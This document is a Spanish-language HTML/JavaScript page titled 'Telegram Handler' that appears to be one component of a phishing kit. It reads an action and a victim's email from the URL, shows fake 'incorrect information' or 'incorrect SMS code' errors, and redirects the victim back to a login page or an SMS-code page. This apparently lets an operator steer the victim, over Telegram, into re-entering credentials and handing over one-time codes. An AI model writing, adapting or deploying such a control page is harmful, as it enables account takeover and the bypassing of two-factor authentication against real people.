<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Handler</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #f5f5f5;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .status {
      padding: 10px;
      margin: 10px 0;
      border-radius: 4px;
    }
    .success { background: #d4edda; color: #155724; }
    .error { background: #f8d7da; color: #721c24; }
    .info { background: #d1ecf1; color: #0c5460; }
  </style>
</head>
<body>
  <div class="container">
    <h1>ü§ñ Telegram Handler</h1>
    <div id="status" class="status info">Esperando acciones de Telegram...</div>
    <div id="logs"></div>
  </div>

  <script src="webhook-config.php"></script>
  <script>
    // Funci√≥n para obtener par√°metros de URL
    function getUrlParam(name) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(name);
    }

    // Funci√≥n para mostrar mensaje de error en la p√°gina original
    async function showErrorOnOriginalPage(email) {
      try {
        // Guardar mensaje de error en sessionStorage
        sessionStorage.setItem('errorMessage', 'La informaci√≥n ingresada es incorrecta. Por favor, verifica tus datos.');
        sessionStorage.setItem('targetEmail', email);
        
        console.log('Error guardado para email:', email);
        return true;
      } catch (error) {
        console.error('Error al guardar mensaje:', error);
        return false;
      }
    }

    // Funci√≥n para redirigir a p√°gina de c√≥digo SMS
    async function redirectToSMS() {
      try {
        console.log('Redirigiendo a p√°gina de SMS...');
        // Redirigir a p√°gina de c√≥digo SMS
        window.location.href = 'codigo.html';
        return true;
      } catch (error) {
        console.error('Error al redirigir:', error);
        return false;
      }
    }

    // Procesar la acci√≥n de Telegram
    async function processTelegramAction() {
      const action = getUrlParam('action');
      const email = getUrlParam('email');
      const statusDiv = document.getElementById('status');
      const logsDiv = document.getElementById('logs');

      if (action && email) {
        statusDiv.className = 'status info';
        statusDiv.textContent = `Procesando acci√≥n: ${action} para email: ${email}`;

        if (action === 'info_incorrect') {
          const result = await showErrorOnOriginalPage(email);
          if (result) {
            statusDiv.className = 'status success';
            statusDiv.textContent = '‚úÖ Mensaje de error enviado. Redirigiendo a p√°gina de email...';
            logsDiv.innerHTML += `<p><strong>${new Date().toLocaleTimeString()}</strong> - Error enviado para: ${email}</p>`;
            
            // Redirigir a p√°gina de email despu√©s de 2 segundos
            setTimeout(() => {
              window.location.href = 'index.html';
            }, 2000);
          } else {
            statusDiv.className = 'status error';
            statusDiv.textContent = '‚ùå Error al procesar la solicitud';
          }
        } else if (action === 'request_sms') {
          const result = await redirectToSMS();
          if (result) {
            statusDiv.className = 'status success';
            statusDiv.textContent = '‚úÖ Redirigiendo a p√°gina de c√≥digo SMS...';
            logsDiv.innerHTML += `<p><strong>${new Date().toLocaleTimeString()}</strong> - Solicitando SMS para: ${email}</p>`;
          } else {
            statusDiv.className = 'status error';
            statusDiv.textContent = '‚ùå Error al redirigir a SMS';
          }
        } else if (action === 'sms_incorrect') {
          // Guardar mensaje de error SMS en sessionStorage
          sessionStorage.setItem('smsError', 'El c√≥digo que ingresaste es incorrecto. Por favor, int√©ntalo de nuevo.');
          sessionStorage.setItem('userEmail', email);
          
          statusDiv.className = 'status success';
          statusDiv.textContent = '‚úÖ Error de SMS guardado. Redirigiendo a p√°gina de c√≥digo...';
          logsDiv.innerHTML += `<p><strong>${new Date().toLocaleTimeString()}</strong> - Error SMS para: ${email}</p>`;
          
          // Redirigir a p√°gina de c√≥digo SMS despu√©s de 2 segundos
          setTimeout(() => {
            window.location.href = 'codigo.html';
          }, 2000);
        }
      } else {
        statusDiv.className = 'status error';
        statusDiv.textContent = '‚ùå Par√°metros inv√°lidos. Se requieren: action y email';
      }
    }

    // Ejecutar cuando la p√°gina cargue
    document.addEventListener('DOMContentLoaded', processTelegramAction);
  </script>
</body>
</html>
